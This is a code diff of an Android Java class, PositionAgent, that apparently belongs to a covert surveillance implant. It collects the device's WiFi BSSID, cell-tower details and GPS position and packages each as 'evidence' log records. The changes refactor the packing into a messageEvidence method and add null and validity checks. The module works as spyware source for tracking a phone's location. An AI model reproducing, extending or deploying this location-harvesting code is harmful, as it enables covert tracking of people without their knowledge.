@@ -145,13 +145,12 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	}
 
 	private void locationWIFI() {
-
 		WifiManager wifiManager = (WifiManager) Status.getAppContext()
 				.getSystemService(Context.WIFI_SERVICE);
 
 		WifiInfo wifi = wifiManager.getConnectionInfo();
 
-		if (wifi != null) {
+		if (wifi != null && wifi.getBSSID() != null) {
 			// #ifdef DEBUG
 			Log.d(TAG, "Info: " + "Wifi: " + wifi.getBSSID());
 			// #endif
@@ -180,25 +179,20 @@ public class PositionAgent extends AgentBase implements LocationListener {
 	private void locationCELL() {
 
 		CellInfo info = Device.getCellInfo();
-		if(!info.valid){
-			Log.d(TAG,"Error: " + "invalid cell info" );
+		if (!info.valid) {
+			Log.d(TAG, "Error: " + "invalid cell info");
+			return;
 		}
 
 		if (info.gsm) {
-		
-				final byte[] payload = getCellPayload(info);
-
-				new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-						getAdditionalData(0, LOG_TYPE_GSM), payload);
-			
-
+			final byte[] payload = getCellPayload(info, LOG_TYPE_GSM);
+			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
+					getAdditionalData(0, LOG_TYPE_GSM), payload);
 		}
 		if (info.cdma) {
-
-			final byte[] payload = getCellPayload(info);
+			final byte[] payload = getCellPayload(info, LOG_TYPE_CDMA);
 			new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
 					getAdditionalData(0, LOG_TYPE_CDMA), payload);
-
 		}
 	}
 
@@ -230,7 +224,13 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		}
 
 		new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD,
-				getAdditionalData(0, LOG_TYPE_GPS), payload);
+		 getAdditionalData(0, LOG_TYPE_GPS), payload);
+
+		/*Evidence logGPS = new Evidence(EvidenceType.LOCATION_NEW);
+		logGPS.createEvidence(getAdditionalData(0, LOG_TYPE_GPS),
+				EvidenceType.LOCATION_NEW);
+		logGPS.writeEvidence(payload);
+		logGPS.close();*/
 
 	}
 
@@ -283,7 +283,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		return additionalData;
 	}
 
-	private void saveEvidence(Evidence acutalEvidence, byte[] payload, int type) {
+	private byte[] messageEvidence(byte[] payload, int type) {
 
 		// #ifdef DBC
 		Check.requires(payload != null, "saveEvidence payload!= null");
@@ -322,7 +322,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 
 		// save log
 
-		acutalEvidence.writeEvidence(message);
+		return message;
 
 	}
 
@@ -380,9 +380,9 @@ public class PositionAgent extends AgentBase implements LocationListener {
 		return payload;
 	}
 
-	private byte[] getCellPayload(CellInfo info) {
+	private byte[] getCellPayload(CellInfo info, int logType) {
 		Check.requires(info.valid, "invalid cell info");
-		
+
 		final int size = 19 * 4 + 48 + 16;
 		final byte[] cellPosition = new byte[size];
 
@@ -422,7 +422,7 @@ public class PositionAgent extends AgentBase implements LocationListener {
 				"getCellPayload wrong size");
 		// #endif
 
-		return cellPosition;
+		return messageEvidence(cellPosition, logType);
 
 	}
 
@@ -509,7 +509,8 @@ public class PositionAgent extends AgentBase implements LocationListener {
 				"saveGPSLog wrong size: " + databuffer.getPosition());
 		// #endif
 
-		return gpsPosition;
+		return messageEvidence(gpsPosition, LOG_TYPE_GPS);
+
 	}
 
 }
